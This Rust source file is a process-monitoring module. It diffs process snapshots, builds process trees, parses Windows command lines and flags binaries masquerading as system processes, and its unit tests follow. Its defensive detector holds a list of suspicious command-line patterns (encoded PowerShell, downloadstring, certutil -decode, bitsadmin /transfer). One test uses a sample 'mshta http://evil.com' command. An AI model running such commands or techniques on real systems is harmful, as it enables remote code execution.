//! Process monitor — snapshot diffing, polling, tree building and command-line parsing.

use std::collections::{HashMap, HashSet};
use std::time::{Duration, Instant};

use serde::{Deserialize, Serialize};

pub use crate::ProcessStatus;
use crate::{ProcessInfo, ProcessTree, SysinternalsError};

// ─── ProcessEvent ─────────────────────────────────────────────────────────────

/// An event that describes a change to the process list.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ProcessEvent {
    /// A new process appeared.
    Started(Box<ProcessInfo>),
    /// A process exited.
    Terminated { pid: u32, name: String },
    /// A property of an existing process changed.
    Modified {
        pid: u32,
        old: Box<ProcessInfo>,
        new: Box<ProcessInfo>,
    },
}

impl ProcessEvent {
    /// PID related to this event.
    #[must_use]
    pub const fn pid(&self) -> u32 {
        match self {
            Self::Started(p) => p.pid,
            Self::Terminated { pid, .. } | Self::Modified { pid, .. } => *pid,
        }
    }

    /// True if this is a process start event.
    #[must_use]
    pub const fn is_start(&self) -> bool {
        matches!(self, Self::Started(_))
    }

    /// True if this is a termination event.
    #[must_use]
    pub const fn is_termination(&self) -> bool {
        matches!(self, Self::Terminated { .. })
    }
}

// ─── ProcessSnapshot ─────────────────────────────────────────────────────────

/// An immutable snapshot of the running process list at a point in time.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessSnapshot {
    /// All processes indexed by PID.
    pub processes: HashMap<u32, ProcessInfo>,
    /// Unix timestamp when the snapshot was taken.
    pub taken_at: u64,
}

impl ProcessSnapshot {
    /// Create a snapshot from a list of processes.
    #[must_use]
    pub fn from_list(processes: Vec<ProcessInfo>) -> Self {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or(Duration::ZERO)
            .as_secs();
        let map = processes.into_iter().map(|p| (p.pid, p)).collect();
        Self {
            processes: map,
            taken_at: now,
        }
    }

    /// Returns `None` if the PID is not present.
    #[must_use]
    pub fn get(&self, pid: u32) -> Option<&ProcessInfo> {
        self.processes.get(&pid)
    }

    /// All PIDs in this snapshot.
    #[must_use]
    pub fn pids(&self) -> HashSet<u32> {
        self.processes.keys().copied().collect()
    }

    /// Number of processes.
    #[must_use]
    pub fn count(&self) -> usize {
        self.processes.len()
    }
}

// ─── ProcessDiff ─────────────────────────────────────────────────────────────

/// The difference between two `ProcessSnapshot`s.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessDiff {
    /// Processes that appeared in `new` but not `old`.
    pub new_processes: Vec<ProcessInfo>,
    /// Processes that were in `old` but not `new` (terminated).
    pub terminated: Vec<ProcessInfo>,
    /// Processes present in both but with changed properties.
    pub modified: Vec<(ProcessInfo, ProcessInfo)>,
}

impl ProcessDiff {
    /// Compute the diff between two snapshots.
    #[must_use]
    pub fn compute(old: &ProcessSnapshot, new: &ProcessSnapshot) -> Self {
        let old_pids = old.pids();
        let new_pids = new.pids();

        let new_processes: Vec<ProcessInfo> = new_pids
            .difference(&old_pids)
            .filter_map(|&pid| new.get(pid))
            .cloned()
            .collect();

        let terminated: Vec<ProcessInfo> = old_pids
            .difference(&new_pids)
            .filter_map(|&pid| old.get(pid))
            .cloned()
            .collect();

        let modified: Vec<(ProcessInfo, ProcessInfo)> = old_pids
            .intersection(&new_pids)
            .filter_map(|&pid| {
                let o = old.get(pid)?;
                let n = new.get(pid)?;
                // Detect meaningful changes: CPU, memory, thread count, status.
                if (o.cpu_usage - n.cpu_usage).abs() > 1.0
                    || o.memory_info.rss != n.memory_info.rss
                    || o.thread_count != n.thread_count
                    || o.status != n.status
                {
                    Some((o.clone(), n.clone()))
                } else {
                    None
                }
            })
            .collect();

        Self {
            new_processes,
            terminated,
            modified,
        }
    }

    /// Returns `true` if there are no changes.
    #[must_use]
    pub const fn is_empty(&self) -> bool {
        self.new_processes.is_empty() && self.terminated.is_empty() && self.modified.is_empty()
    }

    /// Total number of changed entries.
    #[must_use]
    pub const fn change_count(&self) -> usize {
        self.new_processes.len() + self.terminated.len() + self.modified.len()
    }

    /// Convert to a list of `ProcessEvent`s.
    #[must_use]
    pub fn to_events(&self) -> Vec<ProcessEvent> {
        let mut events = Vec::new();
        for p in &self.new_processes {
            events.push(ProcessEvent::Started(Box::new(p.clone())));
        }
        for p in &self.terminated {
            events.push(ProcessEvent::Terminated {
                pid: p.pid,
                name: p.name.clone(),
            });
        }
        for (old, new) in &self.modified {
            events.push(ProcessEvent::Modified {
                pid: old.pid,
                old: Box::new(old.clone()),
                new: Box::new(new.clone()),
            });
        }
        events
    }
}

// ─── ImagePathResolver ───────────────────────────────────────────────────────

/// Resolves process image paths to canonical forms.
pub struct ImagePathResolver {
    /// Known system paths for common Windows processes.
    system_paths: HashMap<String, String>,
}

impl ImagePathResolver {
    #[must_use]
    pub fn new() -> Self {
        let mut system_paths = HashMap::new();
        let system32 = r"C:\Windows\System32";
        let syswow64 = r"C:\Windows\SysWOW64";
        let windows = r"C:\Windows";

        for (name, dir) in &[
            ("svchost.exe", system32),
            ("lsass.exe", system32),
            ("csrss.exe", system32),
            ("wininit.exe", system32),
            ("services.exe", system32),
            ("explorer.exe", windows),
            ("notepad.exe", system32),
            ("cmd.exe", system32),
            ("powershell.exe", system32),
            ("taskmgr.exe", system32),
            ("rundll32.exe", system32),
            ("regsvr32.exe", system32),
            ("mshta.exe", system32),
            ("wscript.exe", system32),
            ("cscript.exe", system32),
            ("svchost.exe", syswow64),
        ] {
            // First-write-wins so the canonical (System32) entry takes
            // precedence over the WoW64 variant for duplicate image names.
            system_paths
                .entry(name.to_lowercase())
                .or_insert_with(|| format!(r"{dir}\{name}"));
        }

        Self { system_paths }
    }

    /// Return the expected canonical path for a known system process.
    #[must_use]
    pub fn canonical_path(&self, name: &str) -> Option<&str> {
        self.system_paths
            .get(&name.to_lowercase())
            .map(std::string::String::as_str)
    }

    /// Returns `true` if the given image path matches the expected canonical path.
    #[must_use]
    pub fn is_canonical(&self, name: &str, actual_path: &str) -> bool {
        self.canonical_path(name)
            .is_none_or(|expected| actual_path.to_lowercase() == expected.to_lowercase())
    }

    /// Returns processes that appear to be masquerading as system processes.
    #[must_use]
    pub fn find_masquerades<'a>(&self, processes: &'a [ProcessInfo]) -> Vec<&'a ProcessInfo> {
        processes
            .iter()
            .filter(|p| {
                let name = p.name.to_lowercase();
                let path = p.exe_path.to_lowercase();
                self.canonical_path(&name)
                    .is_some_and(|canonical| !path.is_empty() && path != canonical.to_lowercase())
            })
            .collect()
    }
}

impl Default for ImagePathResolver {
    fn default() -> Self {
        Self::new()
    }
}

// ─── CommandLineParser ────────────────────────────────────────────────────────

/// Parses Windows-style command-line strings into executable + arguments.
pub struct CommandLineParser;

/// Result of parsing a command line.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ParsedCommandLine {
    /// The executable portion (argv[0]).
    pub executable: String,
    /// Remaining arguments.
    pub args: Vec<String>,
    /// Raw command line.
    pub raw: String,
}

impl ParsedCommandLine {
    /// Returns `true` if any argument matches the given substring.
    #[must_use]
    pub fn has_arg(&self, substr: &str) -> bool {
        self.args.iter().any(|a| a.contains(substr))
    }

    /// Returns the argument at index `i` (0 = first arg after executable).
    #[must_use]
    pub fn arg(&self, i: usize) -> Option<&str> {
        self.args.get(i).map(std::string::String::as_str)
    }
}

impl CommandLineParser {
    /// Parse a Windows command line into tokens, respecting quoted strings.
    #[must_use]
    pub fn parse(cmdline: &str) -> ParsedCommandLine {
        let tokens = Self::tokenize(cmdline);
        let executable = tokens.first().cloned().unwrap_or_default();
        let args = tokens.into_iter().skip(1).collect();
        ParsedCommandLine {
            executable,
            args,
            raw: cmdline.to_string(),
        }
    }

    /// Tokenize a command line string.
    #[must_use]
    pub fn tokenize(cmdline: &str) -> Vec<String> {
        let mut tokens = Vec::new();
        let mut current = String::new();
        let mut in_quotes = false;
        let mut chars = cmdline.chars().peekable();

        while let Some(c) = chars.next() {
            match c {
                '"' => {
                    in_quotes = !in_quotes;
                }
                '\\' if in_quotes => {
                    if chars.peek() == Some(&'"') {
                        current.push('"');
                        chars.next();
                    } else {
                        current.push('\\');
                    }
                }
                ' ' | '\t' if !in_quotes => {
                    if !current.is_empty() {
                        tokens.push(current.clone());
                        current.clear();
                    }
                }
                _ => {
                    current.push(c);
                }
            }
        }
        if !current.is_empty() {
            tokens.push(current);
        }
        tokens
    }

    /// Detect suspicious command-line patterns.
    #[must_use]
    pub fn is_suspicious(cmdline: &str) -> bool {
        let lower = cmdline.to_lowercase();
        let patterns = [
            "-enc",
            "-encodedcommand",
            "-noprofile",
            "-windowstyle hidden",
            "iex(",
            "invoke-expression",
            "downloadstring",
            "webclient",
            "/c cmd",
            "base64",
            "mshta",
            "wscript",
            "cscript",
            "regsvr32 /s",
            "certutil -decode",
            "bitsadmin /transfer",
        ];
        patterns.iter().any(|p| lower.contains(p))
    }
}

// ─── ProcessTreeBuilder ───────────────────────────────────────────────────────

/// Builds a `ProcessTree` from a `ProcessSnapshot`.
pub struct ProcessTreeBuilder;

impl ProcessTreeBuilder {
    /// Build a tree from a snapshot.
    ///
    /// # Errors
    /// Propagates errors from `ProcessTree::from_list`.
    pub fn build(snapshot: &ProcessSnapshot) -> Result<ProcessTree, SysinternalsError> {
        let list: Vec<ProcessInfo> = snapshot.processes.values().cloned().collect();
        ProcessTree::from_list(&list)
    }

    /// Find all immediate children of a PID.
    #[must_use]
    pub fn children_of(snapshot: &ProcessSnapshot, ppid: u32) -> Vec<&ProcessInfo> {
        snapshot
            .processes
            .values()
            .filter(|p| p.ppid == ppid)
            .collect()
    }

    /// Find all descendants of a PID (including direct children).
    #[must_use]
    pub fn descendants_of(snapshot: &ProcessSnapshot, ppid: u32) -> Vec<u32> {
        let mut result = Vec::new();
        let mut queue = vec![ppid];
        let mut visited = HashSet::new();
        while let Some(pid) = queue.pop() {
            if !visited.insert(pid) {
                continue;
            }
            for child in snapshot.processes.values().filter(|p| p.ppid == pid) {
                result.push(child.pid);
                queue.push(child.pid);
            }
        }
        result
    }

    /// Return all orphan PIDs (no parent in the snapshot, pid > 8).
    #[must_use]
    pub fn orphans(snapshot: &ProcessSnapshot) -> Vec<u32> {
        let pids: HashSet<u32> = snapshot.processes.keys().copied().collect();
        snapshot
            .processes
            .values()
            .filter(|p| p.pid > 8 && p.ppid != 0 && !pids.contains(&p.ppid))
            .map(|p| p.pid)
            .collect()
    }
}

// ─── ProcessMonitor ───────────────────────────────────────────────────────────

/// Polling-based process monitor.
pub struct ProcessMonitor {
    poll_interval: Duration,
    last_snapshot: Option<ProcessSnapshot>,
    last_poll: Option<Instant>,
    event_history: Vec<ProcessEvent>,
    max_history: usize,
}

impl ProcessMonitor {
    #[must_use]
    pub const fn new(poll_interval: Duration) -> Self {
        Self {
            poll_interval,
            last_snapshot: None,
            last_poll: None,
            event_history: Vec::new(),
            max_history: 10_000,
        }
    }

    /// Default: poll every 2 seconds.
    #[must_use]
    pub const fn default_interval() -> Self {
        Self::new(Duration::from_secs(2))
    }

    /// Returns `true` if a new poll is due.
    #[must_use]
    pub fn needs_poll(&self) -> bool {
        self.last_poll.is_none_or(|t| t.elapsed() >= self.poll_interval)
    }

    /// Inject a new snapshot (used for testing or real-backend integration).
    pub fn feed_snapshot(&mut self, snapshot: ProcessSnapshot) -> Vec<ProcessEvent> {
        let events = self.last_snapshot.as_ref().map_or_else(Vec::new, |old| {
            let diff = ProcessDiff::compute(old, &snapshot);
            diff.to_events()
        });

        for ev in &events {
            self.event_history.push(ev.clone());
            if self.event_history.len() > self.max_history {
                self.event_history.remove(0);
            }
        }

        self.last_snapshot = Some(snapshot);
        self.last_poll = Some(Instant::now());
        events
    }

    /// Return a reference to the last snapshot, if any.
    #[must_use]
    pub const fn last_snapshot(&self) -> Option<&ProcessSnapshot> {
        self.last_snapshot.as_ref()
    }

    /// Return all recorded events.
    #[must_use]
    pub fn event_history(&self) -> &[ProcessEvent] {
        &self.event_history
    }

    /// Return all start events.
    #[must_use]
    pub fn start_events(&self) -> Vec<&ProcessEvent> {
        self.event_history.iter().filter(|e| e.is_start()).collect()
    }

    /// Return all termination events.
    #[must_use]
    pub fn termination_events(&self) -> Vec<&ProcessEvent> {
        self.event_history
            .iter()
            .filter(|e| e.is_termination())
            .collect()
    }

    /// Clear the event history.
    pub fn clear_history(&mut self) {
        self.event_history.clear();
    }

    /// Set the polling interval.
    pub const fn set_interval(&mut self, interval: Duration) {
        self.poll_interval = interval;
    }

    /// Return the polling interval.
    #[must_use]
    pub const fn poll_interval(&self) -> Duration {
        self.poll_interval
    }
}

// ─── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ProcessStatus;

    #[allow(clippy::similar_names)]
    fn make_process(pid: u32, ppid: u32, name: &str) -> ProcessInfo {
        let mut p = ProcessInfo::new(pid, ppid, name);
        p.exe_path = format!(r"C:\Windows\System32\{name}");
        p.status = ProcessStatus::Running;
        p
    }

    fn make_snapshot(processes: Vec<ProcessInfo>) -> ProcessSnapshot {
        ProcessSnapshot::from_list(processes)
    }

    // ── ProcessSnapshot ───────────────────────────────────────────────────────

    #[test]
    fn snapshot_from_list_indexes_by_pid() {
        let procs = vec![
            make_process(1, 0, "system"),
            make_process(100, 1, "svchost.exe"),
        ];
        let snap = make_snapshot(procs);
        assert!(snap.get(1).is_some());
        assert!(snap.get(100).is_some());
        assert!(snap.get(999).is_none());
        assert_eq!(snap.count(), 2);
    }

    #[test]
    fn snapshot_pids() {
        let procs = vec![make_process(1, 0, "a"), make_process(2, 1, "b")];
        let snap = make_snapshot(procs);
        let pids = snap.pids();
        assert!(pids.contains(&1));
        assert!(pids.contains(&2));
    }

    // ── ProcessDiff ───────────────────────────────────────────────────────────

    #[test]
    fn diff_new_process() {
        let old = make_snapshot(vec![make_process(1, 0, "sys")]);
        let new = make_snapshot(vec![
            make_process(1, 0, "sys"),
            make_process(100, 1, "new.exe"),
        ]);
        let diff = ProcessDiff::compute(&old, &new);
        assert_eq!(diff.new_processes.len(), 1);
        assert_eq!(diff.new_processes[0].pid, 100);
        assert!(diff.terminated.is_empty());
    }

    #[test]
    fn diff_terminated_process() {
        let old = make_snapshot(vec![
            make_process(1, 0, "sys"),
            make_process(200, 1, "old.exe"),
        ]);
        let new = make_snapshot(vec![make_process(1, 0, "sys")]);
        let diff = ProcessDiff::compute(&old, &new);
        assert_eq!(diff.terminated.len(), 1);
        assert_eq!(diff.terminated[0].pid, 200);
    }

    #[test]
    fn diff_no_change() {
        let procs = vec![make_process(1, 0, "sys")];
        let old = make_snapshot(procs.clone());
        let new = make_snapshot(procs);
        let diff = ProcessDiff::compute(&old, &new);
        assert!(diff.is_empty());
        assert_eq!(diff.change_count(), 0);
    }

    #[test]
    fn diff_to_events() {
        let old = make_snapshot(vec![make_process(1, 0, "sys"), make_process(5, 0, "gone")]);
        let new = make_snapshot(vec![
            make_process(1, 0, "sys"),
            make_process(10, 1, "fresh"),
        ]);
        let diff = ProcessDiff::compute(&old, &new);
        let events = diff.to_events();
        assert!(
            events
                .iter()
                .any(|e| matches!(e, ProcessEvent::Started(p) if p.pid == 10))
        );
        assert!(
            events
                .iter()
                .any(|e| matches!(e, ProcessEvent::Terminated { pid: 5, .. }))
        );
    }

    // ── ProcessEvent ─────────────────────────────────────────────────────────

    #[test]
    fn process_event_pid() {
        let ev = ProcessEvent::Started(Box::new(make_process(42, 1, "test.exe")));
        assert_eq!(ev.pid(), 42);
        let ev2 = ProcessEvent::Terminated {
            pid: 99,
            name: "x".into(),
        };
        assert_eq!(ev2.pid(), 99);
    }

    #[test]
    fn process_event_predicates() {
        let ev = ProcessEvent::Started(Box::new(make_process(1, 0, "x")));
        assert!(ev.is_start());
        assert!(!ev.is_termination());
        let ev2 = ProcessEvent::Terminated {
            pid: 1,
            name: "x".into(),
        };
        assert!(ev2.is_termination());
        assert!(!ev2.is_start());
    }

    // ── CommandLineParser ─────────────────────────────────────────────────────

    #[test]
    fn cmdline_simple_parse() {
        let r = CommandLineParser::parse(r"C:\Windows\System32\cmd.exe /c echo hello");
        assert_eq!(r.executable, r"C:\Windows\System32\cmd.exe");
        assert_eq!(r.args, vec!["/c", "echo", "hello"]);
    }

    #[test]
    fn cmdline_quoted_spaces() {
        let r = CommandLineParser::parse(r#""C:\Program Files\app.exe" -flag "hello world""#);
        assert_eq!(r.executable, r"C:\Program Files\app.exe");
        assert_eq!(r.args[0], "-flag");
        assert_eq!(r.args[1], "hello world");
    }

    #[test]
    fn cmdline_empty() {
        let r = CommandLineParser::parse("");
        assert!(r.executable.is_empty());
        assert!(r.args.is_empty());
    }

    #[test]
    fn cmdline_suspicious_detection() {
        assert!(CommandLineParser::is_suspicious(
            "powershell -encodedcommand abc123=="
        ));
        assert!(CommandLineParser::is_suspicious(
            "cmd /c mshta http://evil.com"
        ));
        assert!(!CommandLineParser::is_suspicious(
            r"C:\Windows\notepad.exe file.txt"
        ));
    }

    #[test]
    fn cmdline_has_arg() {
        let r = CommandLineParser::parse("prog.exe -v --output /tmp/out.txt");
        assert!(r.has_arg("-v"));
        assert!(r.has_arg("/tmp"));
        assert!(!r.has_arg("--missing"));
    }

    // ── ImagePathResolver ─────────────────────────────────────────────────────

    #[test]
    fn resolver_canonical_path_known() {
        let r = ImagePathResolver::new();
        assert!(r.canonical_path("svchost.exe").is_some());
        assert!(r.canonical_path("lsass.exe").is_some());
    }

    #[test]
    fn resolver_canonical_path_unknown_returns_none() {
        let r = ImagePathResolver::new();
        assert!(r.canonical_path("unknownapp.exe").is_none());
    }

    #[test]
    fn resolver_is_canonical_ok() {
        let r = ImagePathResolver::new();
        assert!(r.is_canonical("svchost.exe", r"C:\Windows\System32\svchost.exe"));
    }

    #[test]
    fn resolver_find_masquerades() {
        let r = ImagePathResolver::new();
        let mut p = make_process(100, 1, "svchost.exe");
        p.exe_path = r"C:\Temp\svchost.exe".to_string();
        let procs = vec![p];
        let masq = r.find_masquerades(&procs);
        assert_eq!(masq.len(), 1);
    }

    // ── ProcessTreeBuilder ────────────────────────────────────────────────────

    #[test]
    fn tree_builder_children_of() {
        let snap = make_snapshot(vec![
            make_process(1, 0, "sys"),
            make_process(10, 1, "child1"),
            make_process(11, 1, "child2"),
            make_process(20, 10, "grandchild"),
        ]);
        let children = ProcessTreeBuilder::children_of(&snap, 1);
        assert_eq!(children.len(), 2);
    }

    #[test]
    fn tree_builder_descendants_of() {
        let snap = make_snapshot(vec![
            make_process(1, 0, "sys"),
            make_process(10, 1, "child"),
            make_process(20, 10, "grandchild"),
            make_process(30, 20, "great"),
        ]);
        let desc = ProcessTreeBuilder::descendants_of(&snap, 1);
        assert!(desc.contains(&10));
        assert!(desc.contains(&20));
        assert!(desc.contains(&30));
    }

    #[test]
    fn tree_builder_orphans() {
        let snap = make_snapshot(vec![
            make_process(1, 0, "sys"),
            make_process(100, 9999, "orphan"), // 9999 not in snapshot
        ]);
        let orphans = ProcessTreeBuilder::orphans(&snap);
        assert!(orphans.contains(&100));
    }

    // ── ProcessMonitor ────────────────────────────────────────────────────────

    #[test]
    fn monitor_needs_poll_initially() {
        let mon = ProcessMonitor::new(Duration::from_secs(5));
        assert!(mon.needs_poll());
    }

    #[test]
    fn monitor_feed_snapshot_records_events() {
        let mut mon = ProcessMonitor::default_interval();
        let snap1 = make_snapshot(vec![make_process(1, 0, "sys")]);
        mon.feed_snapshot(snap1);
        let snap2 = make_snapshot(vec![
            make_process(1, 0, "sys"),
            make_process(100, 1, "new.exe"),
        ]);
        let events = mon.feed_snapshot(snap2);
        assert!(!events.is_empty());
        assert!(events.iter().any(super::ProcessEvent::is_start));
    }

    #[test]
    fn monitor_history_accumulates() {
        let mut mon = ProcessMonitor::default_interval();
        let snap1 = make_snapshot(vec![make_process(1, 0, "sys")]);
        mon.feed_snapshot(snap1);
        let snap2 = make_snapshot(vec![make_process(1, 0, "sys"), make_process(10, 1, "p2")]);
        mon.feed_snapshot(snap2);
        let snap3 = make_snapshot(vec![make_process(1, 0, "sys")]);
        mon.feed_snapshot(snap3);
        assert!(!mon.event_history().is_empty());
    }

    #[test]
    fn monitor_clear_history() {
        let mut mon = ProcessMonitor::default_interval();
        let snap1 = make_snapshot(vec![make_process(1, 0, "sys")]);
        mon.feed_snapshot(snap1);
        let snap2 = make_snapshot(vec![make_process(1, 0, "sys"), make_process(10, 1, "p")]);
        mon.feed_snapshot(snap2);
        mon.clear_history();
        assert!(mon.event_history().is_empty());
    }

    #[test]
    fn monitor_poll_interval() {
        let mut mon = ProcessMonitor::new(Duration::from_secs(10));
        assert_eq!(mon.poll_interval(), Duration::from_secs(10));
        mon.set_interval(Duration::from_secs(30));
        assert_eq!(mon.poll_interval(), Duration::from_secs(30));
    }
}
